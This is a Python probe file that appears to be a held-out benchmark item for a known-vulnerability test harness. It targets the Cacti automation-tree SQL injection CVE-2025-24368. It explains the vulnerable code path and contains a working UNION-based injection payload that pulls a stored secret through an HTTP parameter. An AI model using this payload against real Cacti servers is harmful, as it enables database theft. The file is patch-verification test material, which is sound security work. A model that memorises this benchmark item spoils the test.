#!/usr/bin/env python3
"""[HELD-OUT] CVE-2025-24368 residual -- Cacti automation-tree WHERE-clause `field` SQL injection.

REAL Cacti deployment: The CVE-2024-31460 fix (present on V1 = 1.2.27) only guarded the
SELECT-list sink ($sql_field, via api_automation_column_exists). The SAME attacker-stored
automation match-rule-item `field` ALSO flows RAW into the WHERE clause through the UNCHANGED
build_rule_item_filter() (lib/api_automation.php):
    $sql_filter .= ' ' . $prefix . '`' . implode('`.`', explode('.', $item['field'])) . '`';
i.e. it is wrapped as a backtick identifier `<field>`. Injecting a backtick closes that
identifier, letting us break out of the WHERE and UNION-SELECT the protected pcb_secrets.secret
(${PCB_FLAG}) into the reflected result rows (7-column query; flag lands in `description`).
This is the residual SQLi CVE-2025-24368 ("incomplete fix" of CVE-2024-31460 -- same tainted
store, sibling sink). Per the advisory, `.` must be avoided (becomes `` `.` ``), so use `hostname`.

Contract (REAL Cacti on real MariaDB, triggered via external HTTP to pcb_probe.php):
  - V1 (1.2.27, 31460-patched): match `field` stored raw -> build_rule_item_filter injects ->
    UNION runs -> ${PCB_FLAG} reflected in a row.description.
  - V2 (1.2.29, 24368-patched): the automation_tree_rules.php store guard (db_column_exists)
    rejects the non-column `field` before sql_save() -> item never persisted -> `(1 != 1)` -> no flag.
The seed `item_field` here is benign (a real column); on V1 it passes the consumption guard.
"""
from __future__ import annotations

# Break out of the backtick identifier, close the WHERE paren, UNION 7 cols; flag -> col 3 (description).
# The leading `hostname\`` closes build_rule_item_filter's opening backtick; `-- ` comments the tail.
_MATCH_FIELD = "hostname`='zzz') UNION SELECT 1,2,(SELECT secret FROM pcb_secrets LIMIT 1),4,5,6,7-- "


def candidate() -> dict:
    return {
        "probe_id": "cve-2025-24368-tree-field-where-union-sqli",
        "method": "GET",
        "endpoint": "/pcb_probe.php?action=run",
        "params": {
            "item_field": "hostname",     # benign seed field (passes consumption guard on V1)
            "m_field": _MATCH_FIELD,      # residual injection: WHERE-clause `field` via build_rule_item_filter
            "m_operation": "0",           # AUTOMATION_OPER_NULL (no leading AND/OR)
            "m_operator": "0",            # AUTOMATION_OP_NONE (op='', non-binary -> no pattern appended)
            "m_pattern": "",
        },
        # Fields consumed directly by oracle.run_probe:
        "item_field": "hostname",
        "m_field": _MATCH_FIELD,
        "m_operation": "0",
        "m_operator": "0",
        "m_pattern": "",
        "sink": "build_rule_item_filter:$sql_filter (match item field)",
    }


if __name__ == "__main__":
    c = candidate()
    print(c["endpoint"], c["params"])
